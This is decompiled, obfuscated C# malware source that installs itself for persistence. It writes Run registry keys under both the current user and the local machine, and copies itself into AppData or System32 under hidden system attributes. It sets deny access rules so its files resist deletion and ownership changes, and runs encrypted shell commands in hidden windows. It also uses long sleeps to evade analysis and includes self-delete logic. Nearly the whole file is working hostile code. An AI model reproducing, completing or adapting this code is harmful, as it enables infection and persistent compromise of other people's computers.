using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class _____________________________________________________________________________
{
	private static System.IO.FileStream _;

	public static string __;

	public static bool ___ = false;

	private static bool ____ = false;

	public static void _()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			_____________________________________________________________________________.________________(______________________.__);
			IL_13:
			num2 = 3;
			_____________________________________________________________________________._________________(_____________________________________________________________________________.__);
			IL_1F:
			num2 = 4;
			if (!_____________________________________________________________________________.____)
			{
				goto IL_2F;
			}
			IL_28:
			num2 = 5;
			_____________________________________________________________________________.____();
			IL_2F:
			goto IL_96;
			IL_31:
			int arg_36_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_36_0);
			IL_57:
			goto IL_8B;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_69:
			goto IL_8B;
		}
		object arg_6B_0;
		endfilter(arg_6B_0 is System.Exception & num != 0 & num3 == 0);
		IL_8B:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_96:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void __(string string_0)
	{
		try
		{
			Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(string_0, true);
			if (registryKey == null)
			{
				Microsoft.Win32.Registry.CurrentUser.CreateSubKey(string_0);
			}
			registryKey.SetValue(______________________________________________________________._________________, <Module>.______<string>(2703211100u) + _____________________________________________________________________________.__ + <Module>._____<string>(349267069u));
			registryKey.Close();
		}
		catch (System.Exception expr_4F)
		{
			ProjectData.SetProjectError(expr_4F);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___()
	{
		int num;
		int num8;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			if (Operators.CompareString(______________________________________________________________._________________, <Module>._______<string>(1177340789u), false) != 0)
			{
				goto IL_30;
			}
			int arg_48E_0 = System.Type.EmptyTypes.Length + 3;
			int num3;
			int num4;
			string text2;
			while (true)
			{
				IL_48E:
				string[] array;
				string text;
				int num5;
				string text3;
				switch (arg_48E_0)
				{
				case 0:
					array[6] = <Module>.______<string>(620915135u);
					Interaction.Shell(string.Concat(array), AppWinStyle.Hide, false, -1);
					if (num3 != -31660)
					{
						goto IL_2BB;
					}
					goto IL_4C5;
				case 1:
					array[0] = <Module>._____<string>(1644963430u);
					array[1] = text;
					arg_48E_0 = System.Type.EmptyTypes.Length + 7;
					continue;
				case 2:
					goto IL_31F;
				case 4:
					IL_425:
					num3 = 4804;
					if (num4 + -599523328 == (-9773 & num4))
					{
						goto IL_31F;
					}
					goto IL_2D6;
				case 5:
					goto IL_4DD;
				case 6:
					IL_396:
					array[4] = <Module>.______<string>(1635443909u);
					array[5] = _____________________________________________________________________________.__;
					num3 = checked((int)-31660.0);
					arg_48E_0 = System.Type.EmptyTypes.Length + 0;
					continue;
				case 7:
					array[2] = ______________________________________________________________._________________;
					array[3] = text;
					arg_48E_0 = System.Type.EmptyTypes.Length + 6;
					continue;
				case 8:
					goto IL_1DF;
				case 9:
					goto IL_4F9;
				case 10:
					array[5] = text2;
					array[6] = <Module>.______<string>(3901353657u);
					num5 = num3;
					num3 = -26730;
					if (num5 != -15514)
					{
						goto IL_2BB;
					}
					goto IL_2BB;
				case 11:
					IL_238:
					num2 = 15;
					text3 = ___________________________________________________________________._(__________________________________________________________________________._______, <Module>._______<string>(2955449767u));
					num3 = (((5726 & 5307 + num5 * 76341248) == 5146) ? (sizeof(byte) + 4803) : (System.Type.EmptyTypes.Length + 1048829397));
					arg_48E_0 = sizeof(byte) + 3;
					continue;
				}
				goto Block_16;
				IL_31F:
				num2 = 18;
				System.IO.File.WriteAllText(text2, text3);
				IL_32C:
				num2 = 19;
				num3 = 11762;
				array = new string[7];
				array[0] = <Module>.____<string>(2700354150u);
				num5 = 11762;
				num3 = 6380;
				array[1] = text;
				array[2] = ______________________________________________________________._________________;
				array[3] = text;
				array[4] = <Module>.____<string>(1630416607u);
				int num6 = (int)((System.IntPtr)(-15514));
				num3 = num6;
				arg_48E_0 = System.Type.EmptyTypes.Length + 10;
				continue;
				IL_2D6:
				num2 = 16;
				text3 = Strings.Replace(text3, <Module>.______<string>(4262558110u), System.Environment.UserName, 1, -1, CompareMethod.Binary);
				if (num3 != 14663)
				{
					IL_300:
					num2 = 17;
					text3 = Strings.Replace(text3, <Module>._______<string>(1953511905u), _____________________________________________________________________________.__, 1, -1, CompareMethod.Binary);
					goto IL_31F;
				}
				goto IL_396;
				IL_2BB:
				Interaction.Shell(string.Concat(array), AppWinStyle.Hide, false, -1);
				if (num3 != -26730)
				{
					goto IL_2D6;
				}
				break;
			}
			IL_3C5:
			num2 = 20;
			System.Threading.Thread.Sleep(5000);
			IL_3D3:
			num2 = 21;
			_____________________________________________________________________________._ = new System.IO.FileStream(text2, System.IO.FileMode.Open, System.IO.FileAccess.Read, System.IO.FileShare.None);
			num3 = -1583;
			goto IL_4C5;
			Block_16:
			IL_4D8:
			goto IL_609;
			IL_4DD:
			num2 = 27;
			_____________________________________________________________________________._______(______________________._);
			IL_4EB:
			num2 = 28;
			_____________________________________________________________________________._______(______________________.___);
			IL_4F9:
			num2 = 29;
			_____________________________________________________________________________._______(______________________._____);
			IL_507:
			num2 = 30;
			_____________________________________________________________________________._______(______________________.____);
			IL_515:
			num2 = 31;
			_____________________________________________________________________________._______(_____________________________________________________________________________.__);
			IL_523:
			num2 = 32;
			_____________________________________________________________________________.____();
			IL_52C:
			goto IL_609;
			IL_30:
			num2 = 5;
			System.Threading.Thread.Sleep(15000);
			IL_3D:
			num2 = 6;
			num3 = 22363;
			int arg_57_0 = -28389376;
			num4 = global::___________._;
			int arg_11B_0;
			if (arg_57_0 + (num4 << 12) != num4 * -9375744)
			{
				if (8686 + num - 6555 == (int)((uint)(6433 ^ num + num) >> 1))
				{
					int num5;
					if (-2500 + num5 - 2235 == -num5)
					{
						arg_11B_0 = 2031576997;
					}
					else
					{
						uint arg_B1_0 = 1u;
						uint arg_AA_0 = 4057865535u;
						int ______ = ______________________._______;
						arg_11B_0 = (((arg_B1_0 & ((arg_AA_0 | (uint)______ >> 5) + (uint)______ ^ (uint)______)) == 1u) ? (sizeof(double) + -1397890079) : (System.Type.EmptyTypes.Length + 1021211034));
					}
				}
				else
				{
					arg_11B_0 = System.Type.EmptyTypes.Length + 17639;
				}
			}
			else
			{
				int num5;
				arg_11B_0 = ((num5 * 7 + 25 * num5 - 8868864 != (num5 | -3047) * 32) ? (System.Type.EmptyTypes.Length + -1390417526) : (sizeof(System.Guid) + -1869600232));
			}
			if (arg_11B_0 != 2745)
			{
				if (global::_____________._.Info.OSFullName.Contains(<Module>.____<string>(4143521188u)))
				{
					int arg_152_0 = -1826;
					int ______2 = ______________________._______;
					if ((arg_152_0 ^ ______2 % 80320) == 0)
					{
						goto IL_4C5;
					}
					if (num3 != 22363)
					{
						goto IL_4C5;
					}
					IL_168:
					num2 = 7;
					_____________________________________________________________________________.____();
				}
				IL_170:
				num2 = 9;
				string text = <Module>.___<string>(4017844528u);
				num3 = 29337;
				IL_186:
				num2 = 10;
				if (!___________________________________________________________________.________())
				{
					goto IL_1AA;
				}
				IL_191:
				num2 = 11;
				string[] array = new string[7];
				arg_48E_0 = System.Type.EmptyTypes.Length + 1;
				goto IL_48E;
				IL_1AA:
				num2 = 13;
				IL_1AE:
				num2 = 14;
				text2 = System.Environment.GetEnvironmentVariable(<Module>._______<string>(2531281878u)) + <Module>.______<string>(1274239456u);
				arg_48E_0 = sizeof(float) + 7;
				goto IL_48E;
			}
			IL_1DF:
			num2 = 25;
			_____________________________________________________________________________._______________(_____________________________________________________________________________.__);
			IL_1ED:
			num2 = 26;
			_____________________________________________________________________________._______(______________________.__);
			uint arg_210_0 = 3630u;
			int num7 = global::___________._;
			arg_48E_0 = (((arg_210_0 ^ ((uint)num7 >> 18) / 1645776796u ^ 536878083u) == 0u) ? (System.Type.EmptyTypes.Length + -1852609654) : (System.Type.EmptyTypes.Length + 5));
			goto IL_48E;
			IL_4C5:
			num2 = 23;
			System.Threading.Thread.Sleep(600000);
			IL_3F1:
			num2 = 24;
			_____________________________________________________________________________._______________(______________________.__);
			arg_48E_0 = System.Type.EmptyTypes.Length + 8;
			goto IL_48E;
			IL_531:
			int arg_538_0 = num8 + 1;
			num8 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_538_0);
			IL_5C5:
			goto IL_5FE;
			num8 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_5DA:
			goto IL_5FE;
		}
		object arg_5DC_0;
		endfilter(arg_5DC_0 is System.Exception & num != 0 & num8 == 0);
		IL_5FE:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_609:
		if (num8 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ____()
	{
		int num;
		int num4;
		try
		{
			IL_00:
			int num2;
			string text;
			while (true)
			{
				ProjectData.ClearProjectError();
				num = 1;
				IL_09:
				num2 = 2;
				int num3;
				int arg_60_0;
				if (___________________________________________________________________.________())
				{
					num3 = (((262144 * num - -1684018084 ^ 8279) == 0) ? (System.Type.EmptyTypes.Length + -2035438485) : (System.Type.EmptyTypes.Length + 4444));
					arg_60_0 = System.Type.EmptyTypes.Length + 3;
				}
				else
				{
					IL_4F:
					num2 = 8;
					num3 = 9176;
					arg_60_0 = System.Type.EmptyTypes.Length + 0;
				}
				while (true)
				{
					int _____________;
					Microsoft.Win32.RegistryKey registryKey2;
					switch (arg_60_0)
					{
					case 0:
						IL_24A:
						num3 = 9176;
						if (((uint)(num4 - 728) >> 2 & 1u) != (uint)(num4 / 4 & 1))
						{
							goto Block_11;
						}
						num2 = 9;
						text = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) + <Module>.___<string>(3375608993u);
						if (num3 == 9176)
						{
							IL_292:
							num2 = 10;
							Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(<Module>.___<string>(734532677u), true);
							arg_60_0 = (((8253 ^ _____________ * 13478 - 1832) != 0) ? (sizeof(float) + 0) : (((94 * num3 + 34 * num3) * 33554432 != -9447) ? 1590552196 : -1772723723));
							continue;
						}
						break;
					case 1:
						IL_211:
						num2 = 5;
						registryKey2.SetValue(<Module>.____<string>(3944878662u), <Module>.____<string>(4104248507u) + text + <Module>.______<string>(2703211100u));
						arg_60_0 = System.Type.EmptyTypes.Length + 6;
						continue;
					case 2:
						goto IL_30B;
					case 3:
						IL_10F:
						num3 = 4444;
						break;
					case 4:
					{
						IL_D5:
						num2 = 11;
						Microsoft.Win32.RegistryKey registryKey;
						registryKey.SetValue(<Module>.______<string>(1538725490u), <Module>.____<string>(1197958444u) + text + <Module>.____<string>(1952435953u));
						arg_60_0 = System.Type.EmptyTypes.Length + 5;
						continue;
					}
					case 5:
					{
						IL_C7:
						num2 = 12;
						Microsoft.Win32.RegistryKey registryKey;
						registryKey.Close();
						goto IL_2FB;
					}
					case 6:
						IL_86:
						num2 = 6;
						registryKey2.Close();
						goto IL_2FB;
					}
					num2 = 3;
					text = System.Environment.GetFolderPath(System.Environment.SpecialFolder.System) + <Module>.______<string>(2594705015u);
					if (num3 == -9045)
					{
						if (num4 - 66528 != num4)
						{
							break;
						}
					}
					IL_149:
					num2 = 4;
					registryKey2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(<Module>.____<string>(2556201429u), true);
					if ((num & 1169178736) + 2337 - -1224736768 != num)
					{
						arg_60_0 = ((((num & num / 26) ^ 268435580) == 0) ? (System.Type.EmptyTypes.Length + -2068356414) : (System.Type.EmptyTypes.Length + 1));
						continue;
					}
					if (((num3 << 11) - 6079 ^ 4386) == 0)
					{
						arg_60_0 = System.Type.EmptyTypes.Length + 1596571622;
						continue;
					}
					int arg_1D8_0 = 14;
					_____________ = <Module>.______________;
					arg_60_0 = (((arg_1D8_0 * _____________ + _____________ * 50 & _____________ * 1155399680) == 5309) ? (System.Type.EmptyTypes.Length + 450697940) : (sizeof(ulong) + 1638871711));
					continue;
					IL_2FB:
					num2 = 14;
					if (System.IO.File.Exists(text))
					{
						goto IL_322;
					}
					int arg_A5_0 = 4;
					int arg_A4_0 = -8891;
					int __________ = <Module>.___________;
					arg_60_0 = (((arg_A5_0 & arg_A4_0 + (__________ << 2)) != (4 & ~__________ * 4)) ? (System.Type.EmptyTypes.Length + 1348734321) : (System.Type.EmptyTypes.Length + 2));
				}
				Block_11:;
			}
			IL_30B:
			num2 = 15;
			System.IO.File.Copy(_____________________________________________________________________________.__, text);
			IL_319:
			num2 = 16;
			_____________________________________________________________________________.__________(text);
			IL_322:
			num2 = 18;
			_____________________________________________________________________________._________________(text);
			IL_32B:
			num2 = 19;
			_____________________________________________________________________________.____ = true;
			IL_334:
			goto IL_3DC;
			IL_339:
			int arg_340_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_340_0);
			IL_399:
			goto IL_3D1;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_3AD:
			goto IL_3D1;
		}
		object arg_3AF_0;
		endfilter(arg_3AF_0 is System.Exception & num != 0 & num4 == 0);
		IL_3D1:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_3DC:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _____()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			_____________________________________________________________________________.____ = false;
			switch (System.Type.EmptyTypes.Length + 0)
			{
			case 0:
			{
				IL_20:
				num2 = 3;
				if (!___________________________________________________________________.________())
				{
					goto IL_4C;
				}
				IL_29:
				num2 = 4;
				string string_ = System.Environment.GetFolderPath(System.Environment.SpecialFolder.System) + <Module>._______<string>(3287423332u);
				IL_43:
				num2 = 5;
				_____________________________________________________________________________.______(string_);
				IL_4C:
				num2 = 7;
				string arg_65_0 = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData);
				__________________________________.____________ = null;
				string_ = arg_65_0 + <Module>.____<string>(256956498u);
				IL_6C:
				num2 = 8;
				_____________________________________________________________________________.______(string_);
				IL_75:
				goto IL_EC;
			}
			}
			goto IL_20;
			IL_77:
			int arg_7E_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_7E_0);
			IL_AB:
			goto IL_E1;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_BE:
			goto IL_E1;
		}
		object arg_C0_0;
		endfilter(arg_C0_0 is System.Exception & num != 0 & num3 == 0);
		IL_E1:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_EC:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ______(string string_0)
	{
		int num;
		int num3;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			int arg_10_0 = 1;
			<Module>.__________ = 2081625616;
			num = arg_10_0;
			IL_11:
			int num2 = 2;
			if (!System.IO.File.Exists(string_0))
			{
				goto IL_2B;
			}
			IL_1B:
			num2 = 3;
			_____________________________________________________________________________._______________(string_0);
			IL_23:
			num2 = 4;
			System.IO.File.Delete(string_0);
			IL_2B:
			<Module>.__________ = 1308380089;
			goto IL_9C;
			IL_37:
			int arg_3C_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_3C_0);
			IL_5D:
			goto IL_91;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_6F:
			goto IL_91;
		}
		object arg_71_0;
		endfilter(arg_71_0 is System.Exception & num != 0 & num3 == 0);
		IL_91:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_9C:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _______(string string_0)
	{
		try
		{
			if (System.IO.Directory.Exists(string_0))
			{
				System.IO.FileInfo fileInfo = new System.IO.FileInfo(string_0);
				fileInfo.Attributes = (System.IO.FileAttributes.ReadOnly | System.IO.FileAttributes.Hidden | System.IO.FileAttributes.System | System.IO.FileAttributes.NotContentIndexed);
			}
		}
		catch (System.Exception arg_1C_0)
		{
			ProjectData.SetProjectError(arg_1C_0);
			ProjectData.ClearProjectError();
		}
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
	public static void ________()
	{
		try
		{
			int arg_D2_0;
			string text;
			int num;
			if (Operators.CompareString(______________________________________________________________.________________, <Module>._____<string>(3717744333u), false) == 0)
			{
				arg_D2_0 = System.Type.EmptyTypes.Length + 2;
			}
			else
			{
				_____________________________________________________________________________.__ = Application.ExecutablePath;
				text = ______________________.__ + ______________________________________________________________.________________;
				num = -32577;
				int arg_55_0 = 4194304;
				int num2 = global::___________._;
				if (arg_55_0 * (num2 << 15) - -2147483648 == num2 % 65 << 5)
				{
					goto IL_15D;
				}
				if (Application.ExecutablePath.Contains(______________________________________________________________.________________))
				{
					goto IL_21D;
				}
				if (!Application.ExecutablePath.Contains(<Module>._______<string>(764547847u)))
				{
					goto IL_133;
				}
				if (num != -32577)
				{
				}
				System.Threading.Thread.Sleep(60000);
				if (______________________________________________________________.____(______________________________________________________________.__________________))
				{
					ProjectData.EndApp();
				}
				if (System.IO.File.Exists(text))
				{
					goto IL_E9;
				}
				goto IL_F1;
			}
			IL_D2:
			switch (arg_D2_0)
			{
			case 0:
				goto IL_12E;
			case 1:
				IL_E9:
				Process.Start(text);
				goto IL_F1;
			case 3:
				global::_____________._.FileSystem.CopyFile(Application.ExecutablePath, text);
				_____________________________________________________________________________.__________(text);
				if (num != 17582)
				{
					goto IL_12E;
				}
				goto IL_15D;
			}
			return;
			IL_F1:
			System.Threading.Thread.Sleep(60000);
			if (!______________________________________________________________.____(______________________________________________________________.__________________))
			{
				goto IL_133;
			}
			IL_12E:
			ProjectData.EndApp();
			IL_133:
			_____________________________________________________________________________._______________(______________________.__);
			if (!global::_____________._.FileSystem.FileExists(text))
			{
				num = 17582;
				arg_D2_0 = sizeof(byte) + 2;
				goto IL_D2;
			}
			goto IL_1D7;
			IL_15D:
			System.Threading.Thread.Sleep(9000);
			if (!System.IO.File.Exists(text))
			{
				goto IL_21D;
			}
			_____________________________________________________________________________.__ = text;
			string arg_193_0 = ______________________________________________________________.___________________;
			string arg_193_1 = <Module>._______<string>(4273329196u);
			______________________._______ = -1978466511;
			if (arg_193_0.Contains(arg_193_1))
			{
				System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(_____________________________________________________________________________._________));
				thread.Start();
			}
			try
			{
				_____________________________________________________________________________.DeleteFile(text + <Module>.______<string>(1524908573u));
				goto IL_21D;
			}
			catch (System.Exception arg_1CB_0)
			{
				ProjectData.SetProjectError(arg_1CB_0);
				ProjectData.ClearProjectError();
				goto IL_21D;
			}
			IL_1D7:
			System.Threading.Thread.Sleep(5000);
			_____________________________________________________________________________._______________(______________________.__);
			_____________________________________________________________________________._______________(text);
			System.IO.File.Move(text, System.IO.Path.GetTempPath() + global::_________________.____________(8, <Module>.______<string>(4059168937u)));
			______________________.__();
			_____________________________________________________________________________.________();
			IL_21D:;
		}
		catch (System.Exception arg_21F_0)
		{
			ProjectData.SetProjectError(arg_21F_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void _________()
	{
		int num;
		int num4;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			System.Threading.Thread.Sleep(60000);
			int num3;
			switch (((-536870913 | num3 / 8 + (num3 << 30)) == -536870913) ? (System.Type.EmptyTypes.Length + 0) : (sizeof(short) + -565184601))
			{
			case 0:
			{
				IL_4A:
				num2 = 3;
				System.Random random = new System.Random();
				IL_52:
				num2 = 4;
				if (!System.IO.File.Exists(_____________________________________________________________________________.__))
				{
					goto IL_A0;
				}
				IL_60:
				num2 = 5;
				FileSystemProxy arg_9B_0 = global::_____________._.FileSystem;
				string arg_9B_1 = Application.ExecutablePath;
				string arg_96_0 = System.IO.Path.GetTempPath();
				System.Random arg_88_0 = random;
				<Module>._____________ = num;
				num3 = arg_88_0.Next(1000, 9000);
				arg_9B_0.MoveFile(arg_9B_1, arg_96_0 + num3.ToString());
				IL_A0:
				goto IL_10D;
			}
			}
			goto IL_4A;
			IL_A2:
			int arg_A7_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_A7_0);
			IL_CC:
			goto IL_102;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_DF:
			goto IL_102;
		}
		object arg_E1_0;
		endfilter(arg_E1_0 is System.Exception & num != 0 & num4 == 0);
		IL_102:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_10D:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void __________(string string_0)
	{
		try
		{
			string text = Application.ExecutablePath + <Module>._____<string>(3894880379u);
			if (System.IO.File.Exists(text))
			{
				global::_____________._.FileSystem.CopyFile(text, string_0 + <Module>.____<string>(3512420499u));
			}
		}
		catch (System.Exception arg_3F_0)
		{
			ProjectData.SetProjectError(arg_3F_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			if (-1757 != System.Type.EmptyTypes.Length + -1758)
			{
			}
			if (!___________________________________________________________________.______())
			{
				int num = 1073741824;
				System.IO.FileStream fileStream = System.IO.File.OpenWrite(string_0);
				for (long num2 = fileStream.Seek(0L, System.IO.SeekOrigin.End); num2 < (long)num; num2 += 1L)
				{
					fileStream.WriteByte(0);
				}
				fileStream.Close();
			}
		}
		catch (System.Exception arg_5A_0)
		{
			ProjectData.SetProjectError(arg_5A_0);
			ProjectData.ClearProjectError();
		}
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
	public static void ____________()
	{
		_____________________________________________________________________________._____();
		try
		{
			_________________________________________________________________.__();
			_____________________________________________________________________________._______________(_____________________________________________________________________________.__);
			_____________________________________________________________________________._______________(______________________.__);
		}
		catch (System.Exception expr_20)
		{
			ProjectData.SetProjectError(expr_20);
			ProjectData.ClearProjectError();
		}
		try
		{
			System.Random random = new System.Random();
			string text = System.IO.Path.GetTempPath() + random.Next(1000, 9000).ToString() + <Module>.___<string>(2972930731u);
			System.IO.File.Move(_____________________________________________________________________________.__, text);
			_________________________________________________.___________(Application.ExecutablePath);
			_________________________________________________.___________(_____________________________________________________________________________.__);
			_____________________________________________________________________________._____________(5000, text);
		}
		catch (System.Exception expr_90)
		{
			ProjectData.SetProjectError(expr_90);
			_________________________________________________.___________(_____________________________________________________________________________.__);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
		System.Environment.Exit(0);
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
	public static void _____________(int int_0, string string_0)
	{
		try
		{
			Process.Start(new ProcessStartInfo(<Module>.______<string>(168821456u))
			{
				Arguments = string.Concat(new string[]
				{
					<Module>.____<string>(1516698134u),
					int_0.ToString(),
					<Module>._____<string>(406488863u),
					string_0,
					<Module>._____<string>(1419880545u)
				}),
				CreateNoWindow = true,
				ErrorDialog = false,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			Process.GetCurrentProcess().Kill();
		}
		catch (System.Exception arg_80_0)
		{
			ProjectData.SetProjectError(arg_80_0);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	[System.Runtime.InteropServices.DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
	public static extern bool DeleteFile(string string_0);

	public static void _______________(string string_0)
	{
		try
		{
			System.IO.DirectoryInfo directoryInfo = new System.IO.DirectoryInfo(string_0);
			System.Security.AccessControl.DirectorySecurity directorySecurity = new System.Security.AccessControl.DirectorySecurity();
			directorySecurity.SetAccessRuleProtection(false, true);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (System.Exception arg_20_0)
		{
			ProjectData.SetProjectError(arg_20_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void ________________(string string_0)
	{
		try
		{
			if (4345 != System.Type.EmptyTypes.Length + 4345)
			{
				goto IL_9E;
			}
			string identity = <Module>.______<string>(857767335u);
			System.IO.DirectoryInfo directoryInfo = new System.IO.DirectoryInfo(string_0);
			int num = -3260;
			System.Security.AccessControl.DirectorySecurity directorySecurity;
			if (System.Type.EmptyTypes.Length + 13302 != -12083)
			{
				<Module>.______________ = -1437277352;
				directorySecurity = new System.Security.AccessControl.DirectorySecurity();
				directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.ReadAttributes, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
				goto IL_DD;
			}
			goto IL_1B2;
			int arg_194_0;
			while (true)
			{
				IL_194:
				switch (arg_194_0)
				{
				case 0:
					goto IL_1B2;
				case 2:
					directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.DeleteSubdirectoriesAndFiles, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
					arg_194_0 = System.Type.EmptyTypes.Length + 3;
					continue;
				case 3:
					goto IL_1E3;
				case 4:
					goto IL_9E;
				}
				break;
			}
			goto IL_DD;
			IL_9E:
			directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.Delete, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
			arg_194_0 = System.Type.EmptyTypes.Length + 2;
			goto IL_194;
			IL_DD:
			directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.AppendData, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
			int num2;
			num = ((num2 * 14 + num2 * 2 + 5100 == 7009) ? (sizeof(float) + -909701266) : (System.Type.EmptyTypes.Length + 3335));
			int num3;
			int num4;
			arg_194_0 = ((~(num2 << 6 | num3 * 262144) == 64 * -num2) ? (sizeof(ushort) + 1989660861) : ((-(3831296 * num3) * 4 + 75048 == (num3 << 19) + 5557) ? (sizeof(byte) + -1974894255) : ((~(num4 + num4) != (int)((uint)(num4 / 108435561) >> 31)) ? (sizeof(System.Guid) + -16) : (sizeof(int) + 780747020))));
			goto IL_194;
			IL_1B2:
			directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.WriteAttributes, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
			if (num4 * 7 + num4 * 25 - 8868864 != (-3047 | num4) * 32)
			{
				if (num == 3335)
				{
					directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.WriteExtendedAttributes, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
					arg_194_0 = sizeof(int) + 0;
					goto IL_194;
				}
			}
			IL_1E3:
			directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.ChangePermissions, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
			directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.TakeOwnership, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
			directorySecurity.SetAccessRuleProtection(false, true);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (System.Exception arg_21D_0)
		{
			ProjectData.SetProjectError(arg_21D_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void _________________(string string_0)
	{
		try
		{
			string identity;
			System.IO.DirectoryInfo directoryInfo;
			System.Security.AccessControl.DirectorySecurity directorySecurity;
			while (true)
			{
				identity = System.Environment.UserName.ToString();
				directoryInfo = new System.IO.DirectoryInfo(string_0);
				int num = System.Type.EmptyTypes.Length + 4317;
				______________________._______ = -1051365525;
